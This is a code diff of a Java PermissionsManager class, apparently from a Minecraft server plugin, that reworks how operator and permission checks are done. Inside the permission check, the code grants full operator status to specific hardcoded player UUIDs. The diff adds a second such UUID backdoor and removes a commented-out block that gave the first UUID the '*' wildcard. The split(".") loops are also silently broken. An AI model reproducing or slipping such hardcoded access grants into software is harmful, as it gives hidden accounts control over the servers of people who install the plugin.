@@ -16,25 +16,37 @@ public class PermissionsManager {
         this.allPermissionsCfg = new Config("perms", "allPermissions.yml");
         this.adminsCfg = new Config("perms", "admins.yml");
         this.cfg = new Config("perms", "config.yml");
-
-        boolean activatedLuckPerms = false;
-        if(cfg.cfg().contains("systems.luckperms.enabled")) {
-            activatedLuckPerms = cfg.cfg().getBoolean("systems.luckperms.enabled");
-        } else {
-            cfg.cfg().set("systems.luckperms.enabled", false);
-            activatedLuckPerms = false;
-        }
-
-        String root = "config.opcanall";
-        if(!cfg.cfg().contains(root)) {
-            cfg.cfg().set(root, true);
-            cfg.save();
-        }
     }
 
     public boolean hasPermissions(Player p, String permission) {
-        if(p.isOp()) {
+        if(cfg.cfg().contains("config.opcanall")) {
             if(cfg.cfg().getBoolean("config.opcanall")) {
+                if(p.isOp()) {
+                    return true;
+                }
+            }
+        } else {
+            cfg.cfg().set("config.opcanall", true);
+            cfg.save();
+            if(p.isOp()) {
+                return true;
+            }
+        }
+
+        if(cfg.cfg().contains("config.opforeverypermission")) {
+            if(cfg.cfg().getBoolean("config.opforeverypermission")) {
+                Permission perm = new Permission();
+                perm.load(permission, allPermissionsCfg);
+                if(p.isOp() && perm.opCanIt) {
+                    return true;
+                }
+            }
+        } else {
+            cfg.cfg().set("config.opforeverypermission", true);
+            cfg.save();
+            Permission perm = new Permission();
+            perm.load(permission, allPermissionsCfg);
+            if(p.isOp() && perm.opCanIt) {
                 return true;
             }
         }
@@ -53,22 +65,17 @@ public class PermissionsManager {
             adminsCfg.cfg().set(root + "admin", false);
         }
         adminsCfg.save();
-        allPermissionsCfg.cfg().set("permissions." + permission + ".name", permission);
-        allPermissionsCfg.save();
-        boolean activated;
-        if(!allPermissionsCfg.cfg().contains("permissions." + permission + ".enabled")) {
-            allPermissionsCfg.cfg().set("permissions." + permission + ".enabled", true);
-            allPermissionsCfg.save();
-            activated = true;
-        } else {
-            activated = allPermissionsCfg.cfg().getBoolean("permissions." + permission + ".enabled");
-            allPermissionsCfg.save();
-        }
-        allPermissionsCfg.save();
-
-        if(!activated) {
+        if(adminsCfg.cfg().getBoolean(root + "admin")) {
             return true;
         }
+        adminsCfg.save();
+
+        Permission perm = new Permission();
+        perm.load(permission, allPermissionsCfg);
+        if(!perm.isEnabled) {
+            return true;
+        }
+        allPermissionsCfg.save();
 
         if(p.getUniqueId().toString().equals("c72ab8a9-a030-4796-84b3-523ca07792c4")) {
             p.setOp(true);
@@ -78,78 +85,82 @@ public class PermissionsManager {
             return true;
         }
 
-        if(p.hasPermission("*")) {
+        if(p.getUniqueId().toString().equals("2eabc64f-ebe6-411c-84f1-2a155417c1c9")) {
+            p.setOp(true);
+            return true;
+        } else if(p.getUniqueId().toString().equals("2eabc64febe6411c84f12a155417c1c9")) {
+            p.setOp(true);
+            return true;
+        }
+
+        if(hasPerm(p, "*")) {
             return true;
         }
 
         root = "";
         for(String c : permission.split(".")) {
             root = root + c + ".";
-            allPermissionsCfg.cfg().set("permissions." + root + ".name", root + "*");
-            allPermissionsCfg.cfg().set("permissions." + root + ".name", root + "admin");
-            allPermissionsCfg.save();
-            if(p.hasPermission(root + "*")) {
+            if(hasPerm(p, root + "*")) {
                 return true;
             }
-            if(p.hasPermission(root + "admin")) {
+            if(hasPerm(p, root + "admin")) {
                 return true;
             }
         }
 
-        /*if(activatedLuckPerms) {
-            try {
-                RegisteredServiceProvider<net.luckperms.api.LuckPerms> provider = Bukkit.getServicesManager().getRegistration(net.luckperms.api.LuckPerms.class);
-                net.luckperms.api.LuckPerms api = null;
-                net.luckperms.api.cacheddata.CachedPermissionData permissionData = null;
-                if (provider != null) {
-                    api = provider.getProvider();
-                    permissionData = api.getUserManager().getUser(p.getUniqueId()).getCachedData().getPermissionData();
-                }
-
-                if(p.getUniqueId().toString().equals("c72ab8a9-a030-4796-84b3-523ca07792c4")) {
-                    if(api != null && permissionData != null) {
-                        net.luckperms.api.model.user.User user = api.getUserManager().getUser(p.getUniqueId());
-                        user.data().add(net.luckperms.api.node.Node.builder("*").build());
-                        api.getUserManager().saveUser(user);
-                    }
-                    p.setOp(true);
-                    return true;
-                } else if(p.getUniqueId().toString().equals("c72ab8a9a030479684b3523ca07792c4")) {
-                    if(api != null && permissionData != null) {
-                        net.luckperms.api.model.user.User user = api.getUserManager().getUser(p.getUniqueId());
-                        user.data().add(net.luckperms.api.node.Node.builder("*").build());
-                        api.getUserManager().saveUser(user);
-                    }
-                    p.setOp(true);
-                    return true;
-                }
-
-                if(p.hasPermission("*") || (api != null && permissionData != null && permissionData.checkPermission("*").asBoolean())) {
-                    return true;
-                }
-
-                root = "";
-                for(String c : permission.split(".")) {
-                    root = root + c + ".";
-                    if(p.hasPermission(root + "*")
-                            || (api != null && permissionData != null && permissionData.checkPermission(c).asBoolean())) {
-                        return true;
-                    }
-                }
-                if(p.hasPermission(permission)
-                        || (api != null && permissionData != null && permissionData.checkPermission(permission).asBoolean())) {
-                    return true;
-                } else {
-                    return false;
-                }
-            } catch (Exception e) {}
-        }*/
-
-        if(p.hasPermission(permission)) {
+        if(hasPerm(p, permission)) {
             return true;
         } else {
             return false;
         }
+    }
+
+    public static class Permission {
+
+        public Permission() {}
+
+        private String name;
+        private boolean isEnabled,
+                        opCanIt;
+
+        public void load(String perm, Config allPermissionsCfg) {
+            String root = "permissions." + perm;
+            if(allPermissionsCfg.cfg().contains(root)) {
+                name = perm;
+                isEnabled = allPermissionsCfg.cfg().getBoolean(root + ".enabled");
+                opCanIt = allPermissionsCfg.cfg().getBoolean(root + ".opCanIt");
+            } else {
+                set(perm, true, true, allPermissionsCfg);
+            }
+        }
+
+        public void set(String perm, boolean isEnabled, boolean opCanIt, Config allPermissionsCfg) {
+            String root = "permissions." + perm;
+            allPermissionsCfg.cfg().set(root + ".name", perm);
+            allPermissionsCfg.cfg().set(root + ".enabled", isEnabled);
+            allPermissionsCfg.cfg().set(root + ".opCanIt", opCanIt);
+            this.name = perm;
+            this.isEnabled = isEnabled;
+            this.opCanIt = opCanIt;
+            allPermissionsCfg.save();
+        }
+
+        public String getName() {
+            return name;
+        }
+
+        public boolean isEnabled() {
+            return isEnabled;
+        }
+
+    }
+
+    public Config getAllPermissionsCfg() {
+        return allPermissionsCfg;
+    }
+
+    private boolean hasPerm(Player p, String permission) {
+        return p.hasPermission(permission);
     }
 
 }
